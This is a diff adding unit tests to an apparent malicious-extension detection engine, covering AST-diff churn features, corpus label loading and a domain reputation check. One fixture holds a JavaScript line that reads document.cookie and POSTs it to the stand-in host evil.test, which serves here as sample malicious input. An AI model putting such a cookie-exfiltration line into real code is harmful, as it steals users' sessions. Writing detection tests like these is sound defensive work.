@@ -156,5 +156,76 @@ class TestPredictBridge(unittest.TestCase):
         self.assertLessEqual(result["probability"], 1.0)
 
 
+class TestAstDiffBaseline(unittest.TestCase):
+    def _dir(self, tmp, name, js):
+        d = Path(tmp) / name
+        d.mkdir(parents=True)
+        (d / "a.js").write_text(js, encoding="utf-8")
+        return d
+
+    def test_identical_dirs_have_zero_churn(self):
+        from engine.features.ast_diff import ast_diff_features
+        with tempfile.TemporaryDirectory() as tmp:
+            a = self._dir(tmp, "a", "function f(x){return x+1;}")
+            b = self._dir(tmp, "b", "function f(x){return x+1;}")
+            f = ast_diff_features(a, b)
+            self.assertEqual(f["ad_churn_ratio"], 0.0)
+            self.assertEqual(f["ad_5gram_divergence"], 0.0)
+
+    def test_renaming_identifiers_is_not_structural_churn(self):
+        from engine.features.ast_diff import ast_diff_features
+        with tempfile.TemporaryDirectory() as tmp:
+            a = self._dir(tmp, "a", "function f(x){return x+1;}")
+            b = self._dir(tmp, "b", "function g(y){return y+1;}")   # only names change
+            self.assertEqual(ast_diff_features(a, b)["ad_churn_ratio"], 0.0)
+
+    def test_added_capability_registers_churn_and_growth(self):
+        from engine.features.ast_diff import ast_diff_features
+        with tempfile.TemporaryDirectory() as tmp:
+            a = self._dir(tmp, "a", "function f(x){return x+1;}")
+            b = self._dir(tmp, "b",
+                          'function f(x){var c=document.cookie;'
+                          'fetch("http://evil.test",{method:"POST",body:c});return x+1;}')
+            f = ast_diff_features(a, b)
+            self.assertGreater(f["ad_churn_ratio"], 0.0)
+            self.assertGreater(f["ad_tokens_added"], 0.0)
+            self.assertGreater(f["ad_size_growth"], 1.0)
+
+
+class TestExtensionDeltasAdapter(unittest.TestCase):
+    def test_missing_corpus_degrades_gracefully(self):
+        from engine.collector.extensiondeltas import load_local_corpus
+        r = load_local_corpus(Path(tempfile.gettempdir()) / "definitely-not-here-xyz")
+        self.assertIn("note", r)
+        self.assertEqual(r["labels"], {})
+
+    def test_cluster_table_yields_labels(self):
+        import csv as _csv
+        from engine.collector.extensiondeltas import load_local_corpus
+        with tempfile.TemporaryDirectory() as tmp:
+            with (Path(tmp) / "clusters.csv").open("w", newline="", encoding="utf-8") as fh:
+                w = _csv.writer(fh)
+                w.writerow(["ext_id", "malicious"])
+                w.writerow(["aaa", "1"]); w.writerow(["bbb", "0"]); w.writerow(["ccc", "1"])
+            r = load_local_corpus(tmp)
+            self.assertEqual(r["n_labelled"], 3)
+            self.assertEqual(r["n_malicious"], 2)
+            self.assertEqual(r["labels"]["bbb"], "benign")
+
+
+class TestNewDeltaFeatures(unittest.TestCase):
+    def test_new_features_are_in_the_catalogue(self):
+        from engine.features.extract import FEATURE_ORDER
+        self.assertIn("msg_passing", FEATURE_ORDER)
+        self.assertIn("net_lowrep_hosts", FEATURE_ORDER)
+
+    def test_domain_low_reputation_flags_dgaish_not_plain(self):
+        from engine.features.extract import domain_low_reputation
+        self.assertTrue(domain_low_reputation("collect-metrics.test"))
+        self.assertTrue(domain_low_reputation("cdn-edge-77.analytics-sync.test"))
+        self.assertFalse(domain_low_reputation("readerapi.test"))
+        self.assertFalse(domain_low_reputation("insights.partner-sdk.test"))
+
+
 if __name__ == "__main__":
     unittest.main()
